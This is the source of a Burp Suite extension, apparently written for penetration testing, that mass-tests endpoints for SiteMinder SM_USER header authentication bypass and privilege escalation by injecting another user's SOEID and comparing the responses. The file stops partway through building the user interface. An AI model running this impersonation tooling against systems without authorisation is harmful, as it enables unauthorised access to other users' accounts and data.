# -*- coding: utf-8 -*-
"""
SM_USER Bypass Scanner - Burp Suite extension (Jython)
======================================================

Automates SiteMinder SM_USER header bypass and privilege-escalation
testing across large numbers of Burp requests.

Two modes:
  Bypass  - strip cookies, inject SM_USER, see if the endpoint returns
            authenticated content anyway. Baseline: fully anonymous.
  Privesc - keep your cookies, inject SM_USER=<other user's SOEID>, see
            if the endpoint returns the other user's data. Baseline:
            your cookies WITHOUT SM_USER, sent twice to establish the
            endpoint's natural noise floor (double-baseline).

Verdicts (Autorize-style three-state):
  BYPASS - high confidence real finding
  MAYBE  - ambiguous, manual eyeball required
  PUBLIC - high confidence no finding
  N/A    - baseline check off / failed

LOADING
-------
1. Download `jython-standalone-2.7.x.jar` from https://www.jython.org/download
2. Burp -> Extensions -> Extensions -> Options -> Python Environment ->
       "Location of Jython standalone JAR file" -> point at the JAR
3. Burp -> Extensions -> Installed -> Add:
       Extension type : Python
       Extension file : <path>\\SMUserBypass.py
4. Open the "SM_USER Bypass" tab.

DESIGN NOTES (for anyone maintaining this file)
-----------------------------------------------
  * Only working hits (2xx) are added to the results table.
  * Bytes for every hit are retained in memory so the double-click Burp
    dialog always works. Auto-save to .txt is OFF by default.
  * Worker submission runs on a background thread so a 60k queue never
    stalls Burp's UI thread. Progress bar and log updates are throttled.
  * `_hits_data` is the single source of truth for a hit's raw bytes.
    The table only stores display-safe scalars.
"""

from burp import (
    IBurpExtender, ITab, IContextMenuFactory, IExtensionStateListener,
    IMessageEditorController, IHttpRequestResponse,
)
from javax.swing import (
    JPanel, JTable, JScrollPane, JButton, JTextField, JLabel, JTextArea,
    JCheckBox, JSplitPane, JFileChooser, SwingUtilities,
    JMenuItem, JPopupMenu, ListSelectionModel, BorderFactory, JProgressBar,
    BoxLayout, JDialog, JOptionPane, KeyStroke, JComponent, AbstractAction,
    RowFilter,
)
from javax.swing.filechooser import FileNameExtensionFilter
from javax.swing.table import DefaultTableModel, TableRowSorter
from java.awt import (
    BorderLayout, GridBagLayout, GridBagConstraints, Insets,
    Font, FlowLayout, Desktop, Toolkit, Color, Dimension,
)
from javax.swing.table import DefaultTableCellRenderer
from java.awt.datatransfer import StringSelection
from java.awt.event import ActionListener, MouseAdapter, KeyEvent
from java.util import ArrayList
from java.util.concurrent import Executors, TimeUnit
from java.util.concurrent.atomic import AtomicInteger, AtomicLong
from java.io import File, FileOutputStream
from java.lang import Runnable, Thread as JThread, String, System
from java.net import URL as JURL

import codecs
import os
import re
import datetime
import traceback
import threading


EXTENSION_NAME        = "SM_USER Bypass Scanner"
DEFAULT_HEADER_NAME   = "SM_USER"
DEFAULT_HEADER_VALUE  = "pk32394"
DEFAULT_WORKING_CODES = "200,201,202,203,204,206,207"
DEFAULT_SKIP_CODES    = "301,302,303,307,308"
DEFAULT_OUTPUT_DIR    = os.path.join(
    os.path.expanduser("~"), "Documents", "SM_USER_Bypass_Results")
DEFAULT_THREADS       = "10"
DEFAULT_DELAY_MS      = "50"
DEFAULT_SKIP_EXTS     = (".js,.mjs,.css,.map,"
                         ".png,.jpg,.jpeg,.gif,.ico,.svg,.webp,.bmp,.avif,"
                         ".woff,.woff2,.ttf,.eot,.otf,"
                         ".mp4,.mp3,.wav,.avi,.mov,.webm,.ogg,"
                         ".pdf,.zip,.gz,.tar,.7z,.rar")

UI_THROTTLE_MS        = 250       # progress bar refresh rate
LOG_MAX_CHARS         = 200000    # ~200 KB
LOG_TRIM_CHARS        = 50000

# ---- UI palette ------------------------------------------------------------
# Row-striping colors for the results table.
_STRIPE_ODD   = Color(247, 249, 251)  # subtle blue-grey
_STRIPE_EVEN  = Color(255, 255, 255)  # white

# Verdict cell tints (chosen for readability with black text).
VERDICT_COLORS = {
    "BYPASS": Color(255, 205, 210),   # soft red -- report this
    "MAYBE":  Color(255, 236, 179),   # soft amber -- eyeball
    "PUBLIC": Color(212, 237, 218),   # soft green -- ignore
    "N/A":    Color(224, 224, 224),   # neutral grey
}
# Mode cell tints.
MODE_COLORS = {
    "PRIVESC": Color(230, 219, 245),  # soft purple
    "BYPASS":  Color(214, 234, 248),  # soft blue
}
# Colored labels used in the count summary bar (text color, on white bg).
VERDICT_TEXT_COLORS = {
    "BYPASS": Color(198,  40,  40),   # deep red
    "MAYBE":  Color(191, 132,  10),   # deep amber
    "PUBLIC": Color( 39, 121,  60),   # deep green
    "N/A":    Color(117, 117, 117),   # grey
}

# Fonts used throughout the tab. Kept small so they scale on any monitor.
_FONT_UI     = Font("Segoe UI", Font.PLAIN, 12)
_FONT_UI_B   = Font("Segoe UI", Font.BOLD,  12)
_FONT_MONO   = Font("Consolas", Font.PLAIN, 12)
_FONT_MONO_S = Font("Consolas", Font.PLAIN, 11)

# Segments matching these patterns get replaced with a placeholder so that
# /users/1, /users/42, /users/9a3f-... all normalize to the same endpoint.
_UUID_RE    = re.compile(
    r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$")
_LONGHEX_RE = re.compile(r"^[0-9a-fA-F]{16,}$")


def _s(text):
    """Python str -> Java byte[] (UTF-8)."""
    return String(text).getBytes("UTF-8")


_URL_METHOD_RE = re.compile(r"^([A-Z]+)\s+(\S.*)$")
_VALID_METHODS = {"GET", "POST", "PUT", "DELETE", "PATCH",
                  "OPTIONS", "HEAD", "TRACE"}


def _parse_url_line(line):
    """One line of a URL file -> (METHOD, url_str) or None to skip.
    Formats accepted:
        https://example.com/foo
        GET https://example.com/foo
        POST https://example.com/api/create
        example.com/foo             (scheme prepended to https)
        # comments and blank lines are skipped
    """
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    m = _URL_METHOD_RE.match(line)
    if m and m.group(1) in _VALID_METHODS:
        method  = m.group(1)
        url_str = m.group(2).strip()
    else:
        method  = "GET"
        url_str = line
    if not (url_str.lower().startswith("http://") or
            url_str.lower().startswith("https://")):
        if "://" in url_str:
            return None
        url_str = "https://" + url_str
    return (method, url_str)


def _url_to_item(helpers, method, url_str):
    """Build a fake IHttpRequestResponse for the given URL + method.
    Returns None if the URL cannot be parsed."""
    try:
        url_obj = JURL(url_str)
    except:
        return None
    host = url_obj.getHost()
    if not host:
        return None
    port = url_obj.getPort()
    protocol = (url_obj.getProtocol() or "https").lower()
    if port == -1:
        port = 443 if protocol == "https" else 80

    try:
        service = helpers.buildHttpService(host, port, protocol)
        req     = helpers.buildHttpRequest(url_obj)   # always GET
    except:
        return None

    if method != "GET":
        try:
            info = helpers.analyzeRequest(req)
            headers = list(info.getHeaders())
            if headers:
                parts = headers[0].split(" ", 1)
                if len(parts) == 2:
                    headers[0] = method + " " + parts[1]
            req = helpers.buildHttpMessage(headers, [])
        except:
            pass

    return _FakeReqResp(service, req, None)


# ---------------------------------------------------------------------------
# Body normalization + similarity (used to eliminate false positives caused
# by dynamic content -- timestamps, tokens, UUIDs -- when comparing two
# response bodies that should be "the same" content).
# ---------------------------------------------------------------------------

_NORMALIZE_PATTERNS = [
    # ISO-8601 timestamps: 2026-08-10T12:34:56[.789][Z|+05:30]
    (re.compile(r"\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?"
                r"(?:Z|[+-]\d{2}:?\d{2})?"), "__TS__"),
    # Common date formats: 2026-08-10, 10/08/2026, Aug 10 2026
    (re.compile(r"\d{4}-\d{2}-\d{2}"), "__DATE__"),
    (re.compile(r"\d{2}/\d{2}/\d{4}"), "__DATE__"),
    # Unix millisecond / second timestamps (10-13 digits standalone)
    (re.compile(r"(?<![A-Za-z0-9_])\d{10,13}(?![A-Za-z0-9_])"), "__UT__"),
    # UUIDs
    (re.compile(r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-"
                r"[0-9a-fA-F]{4}-[0-9a-fA-F]{12}"), "__UUID__"),
    # Long hex strings (session IDs, hashes, tokens) 16+ hex chars
    (re.compile(r"\b[0-9a-fA-F]{16,}\b"), "__HEX__"),
    # Base64 / URL-safe base64 tokens (40+ chars of that alphabet)
    (re.compile(r"\b[A-Za-z0-9+/_-]{40,}={0,3}\b"), "__TOKEN__"),
    # CSRF / anti-forgery tokens in HTML forms and JSON
    (re.compile(r'(csrf|_token|authenticity|xsrf|nonce)[_a-zA-Z]*'
                r'["\s=:]+[^"\s<>&]+',
                re.IGNORECASE), r"\1=__TOKEN__"),
    # ETag / Last-Modified values sometimes echoed in the body
    (re.compile(r'"(etag|last[_-]?modified)":\s*"[^"]*"',
                re.IGNORECASE), r'"\1":"__X__"'),
]


def _normalize_body_from_response(response_bytes, helpers):
    """Extract the body from a full HTTP response byte array, decode to
    text, and normalize dynamic patterns. Returns a normalized string
    (empty string if there is no body). Uses Java String's (bytes, offset,
    length, charset) constructor so we never allocate a Python slice
    over a Java byte[]."""
    if response_bytes is None:
        return ""
    try:
        offset = helpers.analyzeResponse(response_bytes).getBodyOffset()
    except:
        offset = 0
    length = len(response_bytes) - offset
    if length <= 0:
        return ""
    try:
        text = str(String(response_bytes, offset, length, "UTF-8"))
    except:
        try:
            text = str(String(response_bytes, offset, length, "ISO-8859-1"))
        except:
            return ""
    for pat, repl in _NORMALIZE_PATTERNS:
        text = pat.sub(repl, text)
    # Collapse whitespace so a pretty-printed vs minified response still matches.
    text = re.sub(r"\s+", " ", text).strip()
    return text


def _jaccard_similarity(text_a, text_b):
    """Token-set Jaccard similarity in [0.0, 1.0]. Whitespace-tokenized."""
    if not text_a and not text_b:
        return 1.0
    if not text_a or not text_b:
        return 0.0
    tokens_a = set(text_a.split())
    tokens_b = set(text_b.split())
    if not tokens_a and not tokens_b:
        return 1.0
    inter = tokens_a & tokens_b
    union = tokens_a | tokens_b
    if not union:
        return 0.0
    return len(inter) / float(len(union))


def _privesc_verdict(mod_response, b1_response, b2_response, helpers):
    """Three-state verdict for Privesc mode (Autorize-inspired).

    Uses a DOUBLE baseline: baseline1 and baseline2 are two identical anon
    requests. Their difference is the endpoint's natural noise floor. The
    modified response is then compared against that noise floor.

    Returns:
        BYPASS - high confidence privesc happened (mod is dramatically
                 different from both baselines, or introduces many novel
                 tokens like a different user's name/email/id).
        MAYBE  - ambiguous; mod differs from baselines but only partially.
                 Worth manual review (e.g. partial privilege leak, or
                 dynamic content that normalization did not catch).
        PUBLIC - mod matches the baselines within the noise floor
                 (SM_USER was ignored, no escalation).
        N/A    - could not compute.
    """
    if mod_response is None:
        return "N/A"
    if b1_response is None and b2_response is None:
        return "N/A"

    n_mod = _normalize_body_from_response(mod_response, helpers)
    n_b1  = _normalize_body_from_response(b1_response, helpers) if b1_response is not None else None
    n_b2  = _normalize_body_from_response(b2_response, helpers) if b2_response is not None else None

    # 1. Exact match against either baseline after normalization -> PUBLIC.
    if n_b1 is not None and n_mod == n_b1:
        return "PUBLIC"
    if n_b2 is not None and n_mod == n_b2:
        return "PUBLIC"

    # 2. Zero noise floor: baselines are byte-identical after normalization.
    #    Any difference in mod is a real difference.
    if n_b1 is not None and n_b2 is not None and n_b1 == n_b2:
        # Judge magnitude of the difference to choose BYPASS vs MAYBE.
        sim = _jaccard_similarity(n_mod, n_b1)
        tokens_mod = set(n_mod.split())
        tokens_b   = set(n_b1.split())
        novel = len(tokens_mod - tokens_b)
        if sim < 0.5 or novel > 15:
            return "BYPASS"
        if novel > 3 or sim < 0.85:
            return "MAYBE"
        # Very tiny difference with tiny novel-token count -- could be a
        # dynamic bit the normalizer missed. Play it safe with MAYBE.
        return "MAYBE"

    # 3. Only one baseline available: fall back to single-baseline compare.
    if n_b1 is None or n_b2 is None:
        only_baseline = n_b1 if n_b1 is not None else n_b2
        sim = _jaccard_similarity(n_mod, only_baseline)
        if sim >= 0.95:
            return "PUBLIC"
        if sim >= 0.70:
            return "MAYBE"
        return "BYPASS"

    # 4. Both baselines available; they differ post-normalization
    #    (residual dynamic content). Compare against the noise floor.
    sim_bb    = _jaccard_similarity(n_b1, n_b2)           # noise floor
    sim_mb1   = _jaccard_similarity(n_mod, n_b1)
    sim_mb2   = _jaccard_similarity(n_mod, n_b2)
    best_mb   = max(sim_mb1, sim_mb2)

    tokens_mod = set(n_mod.split())
    tokens_b1  = set(n_b1.split())
    tokens_b2  = set(n_b2.split())
    novel     = len(tokens_mod - (tokens_b1 | tokens_b2))

    # High confidence PUBLIC: mod is within the noise floor and adds
    # essentially no new tokens.
    if best_mb + 0.02 >= sim_bb and novel <= 3:
        return "PUBLIC"

    # High confidence BYPASS: mod is far below noise floor, OR mod adds
    # many new tokens that don't appear in either baseline (different
    # user's data leaking through).
    if best_mb < 0.5 or novel > 15:
        return "BYPASS"

    # Middle ground: real difference exists but magnitude is unclear.
    # Autorize would call this "Is enforced???"  -- we call it MAYBE.
    return "MAYBE"


def _compare_responses(orig_response, new_response, helpers):
    """Three-state body comparison (Autorize-inspired):
        SAME  - normalized bodies match exactly or similarity >= 0.95
        MAYBE - similarity 0.70 - 0.95  (ambiguous, needs manual review)
        DIFF  - similarity < 0.70 or huge length gap  (real content change)
        N/A   - one side missing"""
    if orig_response is None or new_response is None:
        return "N/A"

    n_orig = _normalize_body_from_response(orig_response, helpers)
    n_new  = _normalize_body_from_response(new_response,  helpers)

    if not n_orig and not n_new:
        return "SAME"
    if not n_orig or not n_new:
        return "DIFF"
    if n_orig == n_new:
        return "SAME"

    # Fast reject on huge length gap
    lo = len(n_orig)
    ln = len(n_new)
    length_diff = abs(lo - ln)
    max_len = max(lo, ln, 1)
    pct = (100.0 * length_diff) / max_len
    if length_diff > 500 and pct >= 25.0:
        return "DIFF"

    # Similarity-based classification
    sim = _jaccard_similarity(n_orig, n_new)
    if sim >= 0.95:
        return "SAME"
    if sim >= 0.70:
        return "MAYBE"
    return "DIFF"


def _classify_content_type(headers):
    """Classify a response by its Content-Type header. Returns a short
    uppercase label used for the Type column and for filtering."""
    for h in headers:
        lower = h.lower()
        if not lower.startswith("content-type:"):
            continue
        val = h.split(":", 1)[1].strip().lower()
        if "json" in val:                              return "JSON"
        if "html" in val:                              return "HTML"
        if "xml"  in val:                              return "XML"
        if "javascript" in val or "ecmascript" in val: return "JS"
        if "css"  in val:                              return "CSS"
        if val.startswith("text/"):                    return "TEXT"
        if val.startswith("image/"):                   return "IMAGE"
        return "OTHER"
    return "NONE"


# Kept in sync with the Type filter checkboxes in the UI.
CONTENT_TYPES = ["JSON", "HTML", "XML", "JS", "CSS", "TEXT", "IMAGE", "OTHER", "NONE"]
# Kept in sync with the Verdict filter checkboxes in the UI.
# Autorize-style three-state verdict + N/A:
#   BYPASS -- high confidence real finding
#   MAYBE  -- ambiguous, manual eyeball required
#   PUBLIC -- high confidence no finding (endpoint is public / SM_USER ignored)
#   N/A    -- baseline check off or failed
VERDICTS = ["BYPASS", "MAYBE", "PUBLIC", "N/A"]


def _url_extension(url):
    """Return the file extension of the URL's path in lowercase, incl. the
    leading dot. Returns '' when the last segment has no dot."""
    try:
        path = url.getPath() or ""
    except:
        return ""
    path = path.rstrip("/")
    last = path.rsplit("/", 1)[-1]
    if "." not in last:
        return ""
    return "." + last.rsplit(".", 1)[-1].lower()


def _parse_extensions(text):
    """Comma-separated extension list -> set of lowercase '.ext' strings."""
    out = set()
    for tok in (text or "").split(","):
        tok = tok.strip().lower()
        if not tok:
            continue
        if not tok.startswith("."):
            tok = "." + tok
        out.add(tok)
    return out


def _normalize_query(q):
    """Normalize a query string for the dedup key. Replaces numeric / UUID /
    long-hex VALUES (cache-busters, IDs) with placeholders, but preserves
    real string values so RPC-style dispatches like `?uri=GET_SUPER_SECTOR`
    vs `?uri=GET_LIST` are treated as different endpoints. Keys are sorted
    for a consistent hash."""
    if not q:
        return ""
    parts = []
    for pair in q.split("&"):
        if "=" in pair:
            k, v = pair.split("=", 1)
            if v.isdigit():
                v = "{n}"
            elif _UUID_RE.match(v):
                v = "{uuid}"
            elif _LONGHEX_RE.match(v):
                v = "{hex}"
            parts.append(k + "=" + v)
        else:
            parts.append(pair)
    parts.sort()
    return "&".join(parts)


def _endpoint_key(method, url, normalize):
    """Return a canonical (method, endpoint) string used for dedup.

    normalize=True  -> template numeric / UUID / long-hex path segments
                       AND query values, but PRESERVE non-numeric query
                       values (so /svc?uri=A and /svc?uri=B stay distinct).
    normalize=False -> exact URL match (query preserved verbatim)."""
    method = (method or "").upper()
    if not normalize:
        return "%s %s" % (method, url.toString())
    try:
        scheme = (url.getProtocol() or "http").lower()
        host   = (url.getHost() or "").lower()
        port   = url.getPort()
        if port == -1:
            port = 443 if scheme == "https" else 80
        path   = url.getPath() or "/"
        query  = url.getQuery() or ""
    except:
        return "%s %s" % (method, url.toString())

    out = []
    for seg in path.split("/"):
        if not seg:
            out.append(seg); continue
        if seg.isdigit():
            out.append("{n}")
        elif _UUID_RE.match(seg):
            out.append("{uuid}")
        elif _LONGHEX_RE.match(seg):
            out.append("{hex}")
        else:
            out.append(seg)
    norm_path  = "/".join(out)
    norm_query = _normalize_query(query)
    suffix     = ("?" + norm_query) if norm_query else ""
    return "%s %s://%s:%d%s%s" % (method, scheme, host, port, norm_path, suffix)


# ============================================================================
#  Main extension class
# ============================================================================
class BurpExtender(IBurpExtender, ITab, IContextMenuFactory,
                   IExtensionStateListener):

    # ---- lifecycle -------------------------------------------------
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers   = callbacks.getHelpers()
        callbacks.setExtensionName(EXTENSION_NAME)

        self._tested_keys      = set()
        self._tested_keys_lock = threading.Lock()

        # idx -> {service, request, response, method, url, new_status,
        #         orig_status, exported_path}.
        self._hits_data        = {}
        self._hits_data_lock   = threading.Lock()

        self._executor         = None
        self._is_running       = False
        self._cancel_flag      = threading.Event()

        # Pre-filter drop counts from the most recent scan (surfaced in the
        # scan-complete summary so the user can see where a huge history went).
        self._pf_source_count    = 0
        self._pf_scope_skipped   = 0
        self._pf_static_skipped  = 0
        self._pf_dup_skipped     = 0
        self._pf_no_request      = 0
        self._pf_no_service      = 0
        self._pf_no_url          = 0
        self._pf_analyze_fail    = 0
        self._pf_null_item       = 0

        self._request_counter  = AtomicInteger(0)   # total processed
        self._working_counter  = AtomicInteger(0)   # 2xx hits (table rows)
        self._skipped_counter  = AtomicInteger(0)   # 3xx skipped
        self._other_counter    = AtomicInteger(0)   # everything else
        self._total_planned    = AtomicInteger(0)

        # Per-verdict live counters (drive the coloured summary bar).
        self._verdict_counters = {
            "BYPASS": AtomicInteger(0),
            "MAYBE":  AtomicInteger(0),
            "PUBLIC": AtomicInteger(0),
            "N/A":    AtomicInteger(0),
        }

        self._last_ui_update_ms = AtomicLong(0)

        self._build_ui()

        callbacks.addSuiteTab(self)
        callbacks.registerContextMenuFactory(self)
        callbacks.registerExtensionStateListener(self)

        print("[+] %s loaded" % EXTENSION_NAME)
        print("    Default output dir: %s" % DEFAULT_OUTPUT_DIR)

    def extensionUnloaded(self):
        self._cancel_flag.set()
        if self._executor is not None:
            try:
                self._executor.shutdownNow()
            except:
                pass

    # ---- ITab ------------------------------------------------------
    def getTabCaption(self):
        return "SM_USER Bypass"

    def getUiComponent(self):
        return self._main_panel

    # ---- UI construction ------------------------------------------
    def _build_ui(self):
        self._main_panel = JPanel(BorderLayout())

        # ---------- configuration ----------
        cfg = JPanel(GridBagLayout())
        cfg.setBorder(BorderFactory.createTitledBorder("Configuration"))
        gbc = GridBagConstraints()
        gbc.insets = Insets(3, 5, 3, 5)
        gbc.anchor = GridBagConstraints.WEST
        gbc.fill   = GridBagConstraints.HORIZONTAL

        def add_row(row_idx, label_text, comp, wide=False):
            gbc.gridx = 0; gbc.gridy = row_idx; gbc.weightx = 0
            gbc.gridwidth = 1
            cfg.add(JLabel(label_text), gbc)
            gbc.gridx = 1; gbc.weightx = 1
            gbc.gridwidth = 3 if wide else 1
            cfg.add(comp, gbc)
            gbc.gridwidth = 1

        r = 0
        self._header_name_field = JTextField(DEFAULT_HEADER_NAME, 20)
        add_row(r, "Header name:", self._header_name_field); r += 1

        self._header_value_field = JTextField(DEFAULT_HEADER_VALUE, 20)
        self._header_value_field.setToolTipText(
            "In Auth-Bypass mode: any valid SOEID (proves the endpoint "
            "trusts the header). In Privesc mode: the SOEID of the user "
            "you want to impersonate (e.g. an admin).")
        add_row(r, "Header value:", self._header_value_field); r += 1

        # Cookie string used when Privesc mode is on. Format is the same as
        # the Cookie: HTTP header value -- semicolon-separated pairs, e.g.
        #   SMSESSION=xxx; JSESSIONID=yyy; foo=bar
        self._custom_cookie_field = JTextField("", 40)
        self._custom_cookie_field.setToolTipText(
            "Paste the exact value of your own Cookie header (semicolon-"
            "separated pairs). Only used when 'Privesc mode' is checked "
            "below. Leave empty in normal Auth-Bypass mode.")
        add_row(r, "Custom Cookie (privesc):", self._custom_cookie_field,
                wide=True); r += 1

        self._working_codes_field = JTextField(DEFAULT_WORKING_CODES, 30)
        add_row(r, '"Working" status codes:', self._working_codes_field); r += 1

        self._skip_codes_field = JTextField(DEFAULT_SKIP_CODES, 30)
        add_row(r, "Skip status codes (redirects):", self._skip_codes_field); r += 1

        self._skip_ext_field = JTextField(DEFAULT_SKIP_EXTS, 40)
        self._skip_ext_field.setToolTipText(
            "Comma-separated file extensions to skip (js, css, images, "
            "fonts, media, archives). Leave empty to disable.")
        add_row(r, "Skip file extensions:", self._skip_ext_field, wide=True); r += 1

        self._output_dir_field = JTextField(DEFAULT_OUTPUT_DIR, 40)
        browse_btn = JButton("Browse...")
        browse_btn.addActionListener(self._al(self._on_browse_output_dir))
        dir_p = JPanel(BorderLayout(2, 0))
        dir_p.add(self._output_dir_field, BorderLayout.CENTER)
        dir_p.add(browse_btn, BorderLayout.EAST)
        add_row(r, "Output directory:", dir_p, wide=True); r += 1

        self._threads_field = JTextField(DEFAULT_THREADS, 5)
        add_row(r, "Concurrent threads:", self._threads_field); r += 1

        self._delay_field = JTextField(DEFAULT_DELAY_MS, 5)
        add_row(r, "Delay per thread (ms):", self._delay_field); r += 1

        self._in_scope_only_cb = JCheckBox("In-scope items only", True)
        self._dedup_cb         = JCheckBox("Deduplicate endpoints", True)
        self._normalize_cb     = JCheckBox(
            "Normalize (strip query, template IDs/UUIDs)", True)
        self._strip_auth_cb    = JCheckBox("Also strip Authorization headers", False)
        self._log_hits_cb      = JCheckBox("Log every hit to console/log", True)
        self._verify_baseline_cb = JCheckBox(
            "Verify hits with anonymous baseline (+1 req per hit)", True)
        self._verify_baseline_cb.setToolTipText(
            "For every hit, send a second request with NO cookies and NO "
            "SM_USER header (a truly anonymous request). If it returns the "
            "same response, the endpoint is public (PUBLIC verdict). If it "
            "fails or returns something different, SM_USER is doing real "
            "work (BYPASS verdict). Eliminates false positives from "
            "public static JSON, tracker beacons, etc.")
        self._privesc_mode_cb = JCheckBox(
            "Privesc mode (use my cookies + target-user SM_USER)", False)
        self._privesc_mode_cb.setToolTipText(
            "When ON: your Custom Cookie is kept in every request and the "
            "SM_USER header is set to the Header value above (typically "
            "another user's SOEID). The baseline sends your cookies WITHOUT "
            "the SM_USER header, so a BYPASS verdict means SM_USER-swap "
            "actually changed what the server returned -- i.e. privilege "
            "escalation via SM_USER injection.")
        self._auto_save_cb = JCheckBox(
            "Auto-save output files (per-hit .txt + planned manifest)", False)
        self._auto_save_cb.setToolTipText(
            "OFF (default): nothing is written to disk during a scan. Hits "
            "still appear in the table and the double-click dialog. Use the "
            "'Export Visible Hits' button when you want files. "
            "ON: per-hit .txt files and the planned-URLs manifest are "
            "written automatically as before.")
        self._dedup_cb.setToolTipText(
            "Same (method, endpoint) is only sent once per Burp session, "
            "even across multiple scans.")
        self._normalize_cb.setToolTipText(
            "When on, /users/1 and /users/2 and /users/<uuid> count as the "
            "same endpoint. When off, only exact URL matches dedupe.")
        opts = JPanel(FlowLayout(FlowLayout.LEFT, 4, 0))
        opts.add(self._in_scope_only_cb)
        opts.add(self._dedup_cb)
        opts.add(self._normalize_cb)
        opts.add(self._strip_auth_cb)
        opts.add(self._log_hits_cb)
        opts.add(self._verify_baseline_cb)
        opts.add(self._privesc_mode_cb)
        opts.add(self._auto_save_cb)
        gbc.gridx = 0; gbc.gridy = r; gbc.gridwidth = 4; gbc.weightx = 1
        cfg.add(opts, gbc); r += 1; gbc.gridwidth = 1

        # ---------- actions -- split into two logical rows ----------
        act = JPanel()
        act.setLayout(BoxLayout(act, BoxLayout.Y_AXIS))
        act.setBorder(BorderFactory.createTitledBorder("Actions"))

        # Row 1: scanning controls
        scan_row = JPanel(FlowLayout(FlowLayout.LEFT, 6, 4))

        self._btn_scan_history = JButton("Scan Proxy History")
        self._btn_scan_history.setFont(_FONT_UI)
        self._btn_scan_history.addActionListener(self._al(self._on_scan_history))
        scan_row.add(self._btn_scan_history)

        self._btn_scan_sitemap = JButton("Scan Site Map")
        self._btn_scan_sitemap.setFont(_FONT_UI)
        self._btn_scan_sitemap.addActionListener(self._al(self._on_scan_sitemap))
        scan_row.add(self._btn_scan_sitemap)

        self._btn_scan_both = JButton("Scan Both")
        self._btn_scan_both.setFont(_FONT_UI)
        self._btn_scan_both.setToolTipText(
            "Combines proxy history and site map into one scan. "
            "Dedup collapses any overlap so nothing is tested twice.")
        self._btn_scan_both.addActionListener(self._al(self._on_scan_both))
        scan_row.add(self._btn_scan_both)

        self._btn_load_urls = JButton("Load URLs (.txt)")
        self._btn_load_urls.setFont(_FONT_UI)
        self._btn_load_urls.setToolTipText(
            "Load a .txt file (one URL per line, optional METHOD prefix) "
            "and scan those URLs with the same SM_USER logic. "
            "Great for wayback / gau / waymore dumps.")
        self._btn_load_urls.addActionListener(self._al(self._on_load_urls))
        scan_row.add(self._btn_load_urls)

        # Visual separator
        scan_row.add(_v_sep())

        self._btn_stop = JButton("Stop")
        self._btn_stop.setFont(_FONT_UI_B)
        self._btn_stop.setForeground(Color(180, 40, 40))
        self._btn_stop.setEnabled(False)
        self._btn_stop.addActionListener(self._al(self._on_stop))
        scan_row.add(self._btn_stop)

        # Row 2: results / export controls
        res_row = JPanel(FlowLayout(FlowLayout.LEFT, 6, 4))

        self._btn_clear = JButton("Clear Results")
        self._btn_clear.setFont(_FONT_UI)
        self._btn_clear.addActionListener(self._al(self._on_clear))
        res_row.add(self._btn_clear)

        self._btn_export_visible = JButton("Export Visible Hits (.txt)")
        self._btn_export_visible.setFont(_FONT_UI)
        self._btn_export_visible.setToolTipText(
            "Write a .txt file for every row currently visible in the "
            "table (raw request + blank line + raw response). Use this "
            "when Auto-save is off.")
        self._btn_export_visible.addActionListener(
            self._al(self._on_export_visible_hits))
        res_row.add(self._btn_export_visible)

        self._btn_copy_bypass = JButton("Copy BYPASS URLs")
        self._btn_copy_bypass.setFont(_FONT_UI)
        self._btn_copy_bypass.setToolTipText(
            "Copies every URL whose Verdict is BYPASS to the system "
            "clipboard, one per line. Ready to paste into a bug report, "
            "a repeater tab, or a text file.")
        self._btn_copy_bypass.addActionListener(
            self._al(self._on_copy_bypass_urls))
        res_row.add(self._btn_copy_bypass)

        self._btn_copy_visible = JButton("Copy Visible URLs")
        self._btn_copy_visible.setFont(_FONT_UI)
        self._btn_copy_visible.setToolTipText(
            "Copies every URL currently visible in the table (respecting "
            "the Type and Verdict filters).")
        self._btn_copy_visible.addActionListener(
            self._al(self._on_copy_visible_urls))
        res_row.add(self._btn_copy_visible)

        res_row.add(_v_sep())

        self._btn_open_out = JButton("Open Output Folder")
        self._btn_open_out.setFont(_FONT_UI)
        self._btn_open_out.addActionListener(self._al(self._on_open_output))
        res_row.add(self._btn_open_out)

        act.add(scan_row)
        act.add(res_row)

        # ---------- progress + coloured verdict summary bar ----------
        prog_panel = JPanel()
        prog_panel.setLayout(BoxLayout(prog_panel, BoxLayout.Y_AXIS))
        prog_panel.setBorder(BorderFactory.createEmptyBorder(3, 6, 3, 6))

        self._progress_bar = JProgressBar(0, 100)
        self._progress_bar.setStringPainted(True)
        self._progress_bar.setString("Idle")
        self._progress_bar.setFont(_FONT_UI_B)
        self._progress_bar.setPreferredSize(Dimension(0, 22))
        prog_panel.add(self._progress_bar)

        # Summary bar: coloured verdict counts. Rebuilt on each refresh.
        self._summary_bar = JPanel(FlowLayout(FlowLayout.LEFT, 12, 2))
        self._summary_bar.setBorder(BorderFactory.createEmptyBorder(4, 0, 0, 0))
        self._summary_label_hits    = self._summary_label("Hits", "0", Color.BLACK)
        self._summary_label_bypass  = self._summary_label("BYPASS", "0",
                                                          VERDICT_TEXT_COLORS["BYPASS"])
        self._summary_label_maybe   = self._summary_label("MAYBE",  "0",
                                                          VERDICT_TEXT_COLORS["MAYBE"])
        self._summary_label_public  = self._summary_label("PUBLIC", "0",
                                                          VERDICT_TEXT_COLORS["PUBLIC"])
        self._summary_label_na      = self._summary_label("N/A",    "0",
                                                          VERDICT_TEXT_COLORS["N/A"])
        for lbl in (self._summary_label_hits,
                    self._summary_label_bypass,
                    self._summary_label_maybe,
                    self._summary_label_public,
                    self._summary_label_na):
            self._summary_bar.add(lbl)
        prog_panel.add(self._summary_bar)

        top = JPanel()
        top.setLayout(BoxLayout(top, BoxLayout.Y_AXIS))
        top.add(cfg)
        top.add(act)
        top.add(prog_panel)

        # ---------- results table ----------
        cols = ["#", "Method", "URL",
                "Orig Status", "Anon Status", "New Status", "Type",
                "Verdict", "Mode", "vs Original", "New Length", "Diff",
                "Exported To"]
        self._table_model = DefaultTableModel(cols, 0)
        self._table = JTable(self._table_model)
        self._table_sorter = TableRowSorter(self._table_model)
        self._table.setRowSorter(self._table_sorter)
        self._table.setFillsViewportHeight(True)
        self._table.setRowHeight(22)
        self._table.setFont(_FONT_UI)
        self._table.setGridColor(Color(228, 232, 236))
        self._table.setShowVerticalLines(True)
        # Bold header row.
        header = self._table.getTableHeader()
        header.setFont(_FONT_UI_B)
